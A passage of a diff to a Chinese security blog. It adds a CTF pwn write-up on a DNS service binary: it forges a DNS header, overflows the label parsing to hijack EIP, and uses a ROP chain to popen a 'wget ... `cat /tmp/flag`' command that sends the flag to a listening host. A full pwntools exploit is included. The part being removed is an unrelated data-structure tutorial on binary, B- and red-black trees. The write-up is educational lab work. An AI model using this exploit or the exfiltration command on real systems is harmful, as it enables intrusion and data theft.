class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">0</span>c <span class="number">00</span> <span class="number">0</span>a <span class="number">00</span> <span class="number">08</span> b2 <span class="number">7</span>c f0 b9 b1 <span class="number">3</span>a   ...........|...:</span><br><span class="line"><span class="number">0030</span>   <span class="number">81</span> e9                                             ..</span><br></pre></td></tr></table></figure>
+<ul>
+<li>基础结构部分：<code>b2 b6 01 20 00 01 00 00 00 00 00 01</code></li>
+<li>问题部分：（域名+Type+Class）<ul>
+<li>域名：<code>05 baidu 03 com 00</code> </li>
+<li>Type：<code>00 01</code> </li>
+<li>Class：<code>00 01</code></li>
+</ul>
+</li>
+</ul>
+<p>利用这些信息我们可以对 Header 进行伪造：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>,typ=<span class="string">&#x27;udp&#x27;</span>)</span><br><span class="line"></span><br><span class="line">head =  <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;b2b601200001000000000001&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=(<span class="string">b&#x27;\x3f&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3f</span>)*<span class="number">14</span></span><br><span class="line">payload+=<span class="string">b&#x27;\x04&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span></span><br><span class="line">payload+=<span class="string">b&#x27;\x04&#x27;</span>+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">end = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;00010001&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = head + payload + end</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x804f449</span>    add    esp, <span class="number">0x10</span></span><br><span class="line">  <span class="number">0x804f44c</span>    mov    eax, dword ptr [ebp - <span class="number">0x24</span>]</span><br><span class="line">  <span class="number">0x804f44f</span>    jmp    <span class="number">0x804f60f</span>                     &lt;<span class="number">0x804f60f</span>&gt;</span><br><span class="line">   ↓</span><br><span class="line">  <span class="number">0x804f60f</span>    mov    ebx, dword ptr [ebp - <span class="number">4</span>]</span><br><span class="line">  <span class="number">0x804f612</span>    leave  </span><br><span class="line">► <span class="number">0x804f613</span>    ret    &lt;<span class="number">0xdeadbeef</span>&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>已经劫持 EIP 了</li>
+</ul>
+<p>在写 ROP 链之前，我们先考虑怎么拿到 flag：</p>
+<ul>
+<li>首先肯定不能直接执行 system(“/bin/sh”) 或者 one_gadget</li>
+<li>尝试用 StarCTF2022 ping 中的方法把 flag 写入 DNS 的回显信息</li>
+<li>尝试用 SCTF ChristmasWishes 中的方法使用反弹 shell</li>
+</ul>
+<p>具体实现后发现：</p>
+<ul>
+<li>把 flag 写入 DNS 的回显信息可能不现实：GDB 中 search 不到 flag 的地址</li>
+<li>反弹 shell 可能也行不通：程序中没有 system，好像也不能泄露 libc</li>
+</ul>
+<p>网上有个大佬采用 wget 来下载 flag：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 wget http://127.0.0.1:6789/ `cat /tmp/flag`</span><br><span class="line">--2022-07-28 18:09:09--  http://127.0.0.1:6789/</span><br><span class="line">正在连接 127.0.0.1:6789... 失败：拒绝连接。</span><br><span class="line">--2022-07-28 18:09:09--  http://flag%7Byhellow%7D/</span><br><span class="line">正在解析主机 flag&#123;yhellow&#125; (flag&#123;yhellow&#125;)... 失败：未知的名称或服务。</span><br><span class="line">wget: 无法解析主机地址 “flag&#123;yhellow&#125;”</span><br></pre></td></tr></table></figure>
+<ul>
+<li>报错了，可能是本机上的环境不匹配</li>
+</ul>
+<p>程序没有 system 但是有 popen，大佬利用了如下的 ROP：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 0x08059d44 : pop eax ; ret</span></span><br><span class="line"><span class="comment"># 0x08094d60 : add eax, 0x11038 ; nop ; pop ebp ; ret</span></span><br><span class="line"><span class="comment"># 0x0804b639 : add eax, edx ; add esp, 0x10 ; pop ebx ; pop ebp ; ret</span></span><br><span class="line"><span class="comment"># 0x0807ec72 : pop edx ; ret</span></span><br><span class="line"></span><br><span class="line">rop  = p32(<span class="number">0x08059d44</span>)      <span class="comment"># pop eax ; ret</span></span><br><span class="line">rop += p32(<span class="number">0xff83fca0</span>)      <span class="comment"># 0xfffef38d + 0x11038 = 0x3c5, eax = edx + 0x3c5, eax will point to cmd </span></span><br><span class="line">rop += p32(<span class="number">0x08094d60</span>)      <span class="comment"># add eax, 0x11038 ; nop ; pop ebp ; ret</span></span><br><span class="line">rop += p32(<span class="number">0x11223344</span>)      <span class="comment"># padding</span></span><br><span class="line">rop += p32(<span class="number">0x0804b639</span>)      <span class="comment"># add eax, edx ; add esp, 0x10 ; pop ebx ; pop ebp ; ret</span></span><br><span class="line">rop += p32(<span class="number">0x11223344</span>) * <span class="number">6</span>  <span class="comment"># padding</span></span><br><span class="line">rop += p32(<span class="number">0x0807ec72</span>)      <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop += p32(<span class="number">0x0809C7B2</span>)      <span class="comment"># string r</span></span><br><span class="line">rop += p32(<span class="number">0x08071802</span>)      <span class="comment"># push edx(r) ; push eax(cmd) ; call popen</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>我也想写一个 ROP，但是没有合适的 gadget，感觉就是大佬的这个最好用</li>
+</ul>
+<p>结果：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x8071804</span>    call   popen@plt                     &lt;popen@plt&gt;</span><br><span class="line">       command: <span class="number">0xffcfd3ac</span> ◂— <span class="string">&#x27;wget http://127\\x2e0\\x2e0\\x2e1:6789/ `cat /tmp/flag`&#x27;</span></span><br><span class="line">       modes: <span class="number">0x809c7b2</span> ◂— <span class="number">0x2b610072</span> <span class="comment">/* &#x27;r&#x27; */</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> ni</span></span><br><span class="line">[Attaching after process 4156 vfork to child process 4585]</span><br><span class="line">[New inferior 2 (process 4585)]</span><br><span class="line">[Detaching vfork parent process 4156 after child exec]</span><br><span class="line">[Inferior 1 (process 4156) detached]</span><br><span class="line">process 4585 is executing new program: /usr/bin/dash</span><br><span class="line">Warning:</span><br><span class="line">Cannot insert breakpoint 1.</span><br><span class="line">Cannot access memory at address 0x804f444</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1659009039630.png" alt="1659009039630"> </p>
+<ul>
+<li>已经可以看见 popen 生成的进程了</li>
+</ul>
+<p>完整 exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>,typ=<span class="string">&#x27;udp&#x27;</span>)</span><br><span class="line"></span><br><span class="line">vps = <span class="string">b&quot;127.0.0.1:6789&quot;</span></span><br><span class="line">cmd = <span class="string">b&quot;wget http://%s/ `cat /tmp/flag`&quot;</span> % (vps.replace(<span class="string">b&#x27;.&#x27;</span>,<span class="string">b&#x27;\\x2e&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x08059d44 : pop eax ; ret</span></span><br><span class="line"><span class="comment"># 0x08094d60 : add eax, 0x11038 ; nop ; pop ebp ; ret</span></span><br><span class="line"><span class="comment"># 0x0804b639 : add eax, edx ; add esp, 0x10 ; pop ebx ; pop ebp ; ret</span></span><br><span class="line"><span class="comment"># 0x0807ec72 : pop edx ; ret</span></span><br><span class="line"></span><br><span class="line">rop  = p32(<span class="number">0x08059d44</span>)      <span class="comment"># pop eax ; ret</span></span><br><span class="line">rop += p32(<span class="number">0xfffef38d</span>)      <span class="comment"># 0xfffef38d + 0x11038 = 0x3c5, eax = edx + 0x3c5, eax will point to cmd </span></span><br><span class="line">rop += p32(<span class="number">0x08094d60</span>)      <span class="comment"># add eax, 0x11038 ; nop ; pop ebp ; ret</span></span><br><span class="line">rop += p32(<span class="number">0x11223344</span>)      <span class="comment"># padding</span></span><br><span class="line">rop += p32(<span class="number">0x0804b639</span>)      <span class="comment"># add eax, edx ; add esp, 0x10 ; pop ebx ; pop ebp ; ret</span></span><br><span class="line">rop += p32(<span class="number">0x11223344</span>) * <span class="number">6</span>  <span class="comment"># padding</span></span><br><span class="line">rop += p32(<span class="number">0x0807ec72</span>)      <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop += p32(<span class="number">0x0809C7B2</span>)      <span class="comment"># string r</span></span><br><span class="line">rop += p32(<span class="number">0x08071802</span>)      <span class="comment"># push edx(r) ; push eax(cmd) ; call popen</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(rop)) <span class="comment"># len(rop) &lt; 63</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(cmd)) <span class="comment"># len(cmd) &lt; 59)</span></span><br><span class="line"></span><br><span class="line">payload   = (<span class="string">b&#x27;\x3f&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3f</span>) * <span class="number">14</span></span><br><span class="line">payload  +=  <span class="string">b&#x27;\x04&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload  +=  <span class="string">b&#x27;\x3f&#x27;</span>+rop.ljust(<span class="number">0x3f</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload  +=  <span class="built_in">chr</span>(<span class="built_in">len</span>(cmd)).encode() + cmd</span><br><span class="line">payload  +=  <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">head = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;000001200001000000000001&quot;</span>)</span><br><span class="line">end  = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;00010001&quot;</span>)</span><br><span class="line">io.send(head+payload+end)</span><br></pre></td></tr></table></figure>
+<hr>
+<p><strong>小结：</strong></p>
+<p>可能是因为环境的问题，我没法拿到 flag，但 popen 应该是成功执行了</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/26/fuzz%E5%9C%A8heap%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8+UAF/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2200,250 +2521,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="yhellow">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pwn进你的心">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/" class="post-title-link" itemprop="url">数据结构：红黑树</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-06-18 11:36:25" itemprop="dateCreated datePublished" datetime="2022-06-18T11:36:25+08:00">2022-06-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-11-04 12:28:14" itemprop="dateModified" datetime="2022-11-04T12:28:14+08:00">2022-11-04</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>3.3k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>3 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="二叉树-BT"><a href="#二叉树-BT" class="headerlink" title="二叉树-BT"></a>二叉树-BT</h2><p>二叉树（Binary tree）是树形结构的一个重要类型</p>
-<p><strong>相关术语</strong></p>
-<ul>
-<li>①节点：包含一个数据元素及若干指向子树分支的信息 </li>
-<li>②节点的度：一个节点拥有子树的数目称为节点的度 </li>
-<li>③叶子节点：也称为终端节点，没有子树的节点或者度为零的节点 </li>
-<li>④分支节点：也称为非终端节点，度不为零的节点称为非终端节点 </li>
-<li>⑤树的度：树中所有节点的度的最大值 </li>
-<li>⑥节点的层次：从根节点开始，假设根节点为第1层，根节点的子节点为第2层，依此类推，如果某一个节点位于第L层，则其子节点位于第L+1层 </li>
-<li>⑦树的深度：也称为树的高度，树中所有节点的层次最大值称为树的深度 </li>
-<li>⑧有序树：如果树中各棵子树的次序是有先后次序，则称该树为有序树 </li>
-<li>⑨无序树：如果树中各棵子树的次序没有先后次序，则称该树为无序树 </li>
-<li>⑩森林：由m（m≥0）棵互不相交的树构成一片森林，如果把一棵非空的树的根节点删除，则该树就变成了一片森林，森林中的树由原来根节点的各棵子树构成 </li>
-</ul>
-<img src="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/1655340556836-1667461359786.png" class width="1655340556836"> 
-<p>树是一种重要的数据结构，其本质作用就是存储信息，接下来我们重点分析红黑树和它的前身，体会它们的优劣势</p>
-<h2 id="二叉查找树-BST"><a href="#二叉查找树-BST" class="headerlink" title="二叉查找树-BST"></a>二叉查找树-BST</h2><p>二叉查找树（Binary Search Tree）又称为二叉排序树，二叉搜索树，它或者是一棵空树，或者是具有以下性质的二叉树： </p>
-<ul>
-<li>若它的左子树不为空，则左子树上所有结点的值都小于根结点的值</li>
-<li>若它的右子树不为空，则右子树上所有结点的值都大于根结点的值</li>
-<li>它的左右子树也分别是二叉搜索树</li>
-</ul>
-<img src="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/1655340728810-1667461359787.png" class width="1655340728810"> 
-<p>这种树最大的特点就是：左边结点 &lt; key &lt; 右边结点（子结点也是这样的性质）</p>
-<p>在查找某个数据 m 时，就可以通过对比 key 与 m 的大小，来判断到底去左结点还是右结点，这种基于二分法的查找方式大大提高了效率</p>
-<p>但二叉查找树也有它的缺点，先看以下例子：</p>
-<img src="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/1655341100084-1667461359787.png" class width="1655341100084">  
-<p>依次插入：7，6，5，4，3，由于每一次插入的值都比对应的 key 小，所以这些数据都会插入树的左结点，发挥不出树的查找优势了（使树“退化”为链表）</p>
-<p>这个问题的本质就是：树的左右两边不平衡</p>
-<p>平衡二叉树就是用于解决这个问题的，而实现平衡的算法多种多样，就是效率有差别，接下来分析几个平衡算法</p>
-<h2 id="二叉平衡搜索树-AVL"><a href="#二叉平衡搜索树-AVL" class="headerlink" title="二叉平衡搜索树-AVL"></a>二叉平衡搜索树-AVL</h2><p>二叉平衡搜索树是最早被发明的自平衡二叉查找树，由前苏联的数学家 <strong>A</strong>delse-<strong>V</strong>elskil 和 <strong>L</strong>andis 在 1962 年提出的高度平衡的二叉树，根据科学家的英文名也称为 AVL 树</p>
-<p>它具有如下几个性质：</p>
-<ul>
-<li>可以是空树</li>
-<li>假如不是空树，任何一个结点的左子树与右子树都是平衡二叉树</li>
-<li>所有结点平衡因子的绝对值都不超过 1</li>
-<li><strong>平衡因子</strong>：左子树高度 - 右子树高度</li>
-</ul>
-<p>下图，新插入节点 37，该树不再是平衡二叉树，因为，节点 58 的左右子树高度差为 2：</p>
-<img src="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/1655342231017-1667461359787.png" class width="1655342231017">  
-<p>为了使该树重新变为平衡二叉树，需要用到 <strong>平衡二叉树的左旋/右旋</strong></p>
-<p>右旋：将根节点绕左儿子 <strong>顺时针下压</strong></p>
-<img src="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/1655342431261-1667461359787.png" class width="1655342431261"> 
-<p>左旋：将根节点绕右儿子 <strong>逆时针下压</strong> </p>
-<img src="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/1655342594105-1667461359787.png" class width="1655342594105"> 
-<p>最后就该考虑：什么时候使用左旋，什么时候使用右旋</p>
-<p>为此，需要判断调整的四种情况：</p>
-<ul>
-<li>LL：新插入节点为最小不平衡子树根节点的左儿子的左子树上 → 右旋使其恢复平衡</li>
-<li>RR：新插入节点为最小不平衡子树根节点的右儿子的右子树上 → 左旋使其恢复平衡</li>
-<li>LR：新插入节点为最小不平衡子树根节点的左儿子的右子树上 → 以左儿子为根节点进行左旋，再按原始的根节点右旋</li>
-<li>RL：新插入节点为最小不平衡子树根节点的右儿子的左子树上 → 以右儿子为根节点进行右旋，再按原始的根节点左旋</li>
-</ul>
-<h2 id="B树-B"><a href="#B树-B" class="headerlink" title="B树-B"></a>B树-B</h2><p>B-树是一种平衡的多路查找树</p>
-<ul>
-<li>注意：B树就是B-树，”-“是个连字符号，不是减号</li>
-</ul>
-<p>我们假设我们的数据量达到了亿级别，主存当中根本存储不下，我们只能以块的形式从磁盘读取数据，与主存的访问时间相比，磁盘的 I/O 操作相当耗时，而提出 B-树的主要目的就是减少磁盘的 I/O 操作 </p>
-<p>一颗 m 阶的B树定义如下：</p>
-<ul>
-<li>每个结点最多有 m-1 个关键字</li>
-<li>根结点最少可以只有1个关键字</li>
-<li>非根结点至少有 Math.ceil(m/2)-1 个关键字（Math.ceil：向上取整）</li>
-<li>每个结点中的关键字都按照从小到大的顺序排列，每个关键字的左子树中的所有关键字都小于它，而右子树中的所有关键字都大于它</li>
-<li>所有叶子结点都位于同一层，或者说根结点到每个叶子结点的长度都相同</li>
-</ul>
-<img src="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/1655431958744-1667461359787.png" class width="1655431958744"> 
-<ul>
-<li>上图是一个4阶的B树，所以每个结点最多有3个关键字</li>
-<li>在实际应用中的B树的阶数 m 都非常大（通常大于100），所以即使存储大量的数据，B树的高度仍然比较小</li>
-<li>一个 key 和其对应的 data 称为一个记录，即键值对（key, value）</li>
-</ul>
-<p>B树，插入操作：</p>
-<p>插入操作是指插入一条记录，即（key, value）的键值对，如果B树中已存在需要插入的键值对，则用需要插入的 value 替换旧的 value，若B树不存在这个 key，则一定是在叶子结点中进行插入操作</p>
-<ul>
-<li>根据要插入的 key 的值，找到叶子结点并插入</li>
-<li>断当前结点 key 的个数是否小于等于 m-1，若满足则结束，否则进行第3步</li>
-<li>以结点中间的 key 为中心分裂成左右两部分，然后将这个中间的 key 插入到父结点中， <strong>这个 key 的左子树指向分裂后的左半部分，这个 key 的右子支指向分裂后的右半部分，然后将当前结点指向父结点</strong> ，继续进行第3步</li>
-</ul>
-<p>案例如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">22</span> &lt;-&gt; <span class="number">39</span> &lt;-&gt; <span class="number">41</span> &lt;-&gt; <span class="number">97</span> </span><br><span class="line">    =&gt; <span class="number">53</span> <span class="comment">/* 新插入 */</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">22</span> &lt;-&gt; <span class="number">39</span> &lt;-&gt; <span class="number">41</span> &lt;-&gt; <span class="number">53</span> &lt;-&gt; <span class="number">97</span> <span class="comment">/* 插入后超过了最大允许的关键字个数4 */</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">		<span class="number">41</span></span><br><span class="line"><span class="number">22</span> &lt;-&gt; <span class="number">39</span>	<span class="number">53</span> &lt;-&gt; <span class="number">97</span> <span class="comment">/* 以key值为41为中心进行分裂(称为key的子结点) */</span></span><br></pre></td></tr></table></figure>
-<img src="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/1655433286987-1667461359787.png" class width="1655433286987"> 
-<ul>
-<li>这个 key 的左子树指向分裂后的左半部分</li>
-<li>这个 key 的右子支指向分裂后的右半部分</li>
-<li>然后将当前结点指向父结点</li>
-</ul>
-<p>B树，删除操作：</p>
-<p>删除操作是指，根据 key 删除记录，如果B树中的记录中不存对应 key 的记录，则删除失败</p>
-<ul>
-<li>找到叶节点</li>
-<li>如果叶节点中有多于<code>m//2</code>个键，则从节点中删除所需的键</li>
-<li>如果叶节点不多于<code>m//2</code>个键，则通过从<code>8</code>个或左兄弟中获取元素来完成键<ul>
-<li>如果左侧兄弟包含多于<code>m//2</code>个元素，则将其最大元素推送到其父元素，并将插入元素向下移动到删除键的节点</li>
-<li>如果右侧兄弟包含多于<code>m//2</code>个元素，则将其最小元素向上推送到父节点，并将插入元素向下移动到删除键的节点</li>
-</ul>
-</li>
-<li>如果兄弟节点都不包含多于<code>m//2</code>个元素，则通过连接两个叶节点和父节点的插入元素来创建新的叶节点</li>
-<li>如果父节点的节点少于<code>m//2</code>，那么也应在父节点上应用上述过程</li>
-<li>如果要删除的节点是内部节点，则将节点替换为其有序后继或前一个节点，由于后继或前任将始终位于叶节点上，因此该过程将类似于从叶节点中删除节点</li>
-</ul>
-<img src="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/1655434588426-1667461359787.png" class width="1655434588426"> 
-<ul>
-<li>总之叶节点不能少于<code>m//2</code>个键</li>
-<li>如果少于，则把该父结点以及它的所有子结点 <strong>重新整合</strong> 到其他结点上</li>
-</ul>
-<h2 id="234树-234"><a href="#234树-234" class="headerlink" title="234树-234"></a>234树-234</h2><p>2-3-4树是4阶的B树，它被称为2-3-4树，因为非叶非根节点的子节点数为 2, 3 或 4，同时，2-3-4树也是红黑树的前身</p>
-<p>2-3-4树的特点：</p>
-<ul>
-<li>它是平衡树</li>
-<li>每个节点最多可以存三个数据项</li>
-<li>不存在空节点</li>
-<li>叶节点可以有数据项没有子节点</li>
-<li>插入数据项的时候数据总是插入在叶节点中（这点很重要）</li>
-<li>对于非叶节点来说：<ul>
-<li>有一个数据项的节点总是有两个子节点</li>
-<li>有两个数据项的节点总是有三个子节点</li>
-<li>有三个数据项的节点总是有四个子节点</li>
-<li>L：表示子节点个数</li>
-<li>D：表示数据项个数</li>
-<li>针对非叶节点：L = D+1</li>
-<li>子节点个数=数据项个数+1</li>
-</ul>
-</li>
-</ul>
-<h2 id="红黑树"><a href="#红黑树" class="headerlink" title="红黑树"></a>红黑树</h2><p>红黑树是对概念模型2-3-4树的一种实现，由于直接进行不同节点间的转化会造成较大的开销，所以选择以二叉树为基础，在二叉树的属性中加入一个 <strong>颜色属性</strong> 来表示2-3-4树中不同的节点</p>
-<p>红黑规则：</p>
-<ul>
-<li>节点不是黑色，就是红色（非黑即红）</li>
-<li>根节点为黑色，叶节点为黑色（叶节点是指末梢的空节点 <code>Nil</code>或<code>Null</code>）</li>
-<li>一个节点为红色，则其两个子节点必须是黑色的（根到叶子的所有路径，不可能存在两个连续的红色节点）</li>
-<li>每个节点到叶子节点的所有路径，都包含相同数目的黑色节点（相同的黑色高度）</li>
-</ul>
-<img src="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/1655522256900-1667461359787.png" class width="1655522256900">  
-<ul>
-<li>4个规则必须全部符合，就构成了红黑树</li>
-</ul>
-<p>在插链的过程中，可能会破坏这些规则，这就需要一些机制来恢复平衡</p>
-<p>变色：</p>
-<ul>
-<li>为了重新符合红黑树的规则，尝试把红色节点变为黑色，或者把黑色节点变为红色</li>
-</ul>
-<img src="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/1655523253288-1667461359787.png" class width="1655523253288"> 
-<img src="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/1655523267712-1667461359787.png" class width="1655523267712"> 
-<img src="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/1655523286624-1667461359787.png" class width="1655523286624"> 
-<p>左旋转：</p>
-<ul>
-<li>左旋转，就是将S点旋转到根节点，S节点的左边都挂到E节点的右边</li>
-<li>就是将要旋转的子结点的左边挂到之前节点E的右边</li>
-</ul>
-<p>右旋转：</p>
-<ul>
-<li>将要旋转的子结点的右边移到之前结点E的左边</li>
-</ul>
-<img src="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/v2-cdcaec3a23aa3aafe534528f80221c04_b-1667461359787.gif" class title="v2-cdcaec3a23aa3aafe534528f80221c04_b"> 
-<p>总结：</p>
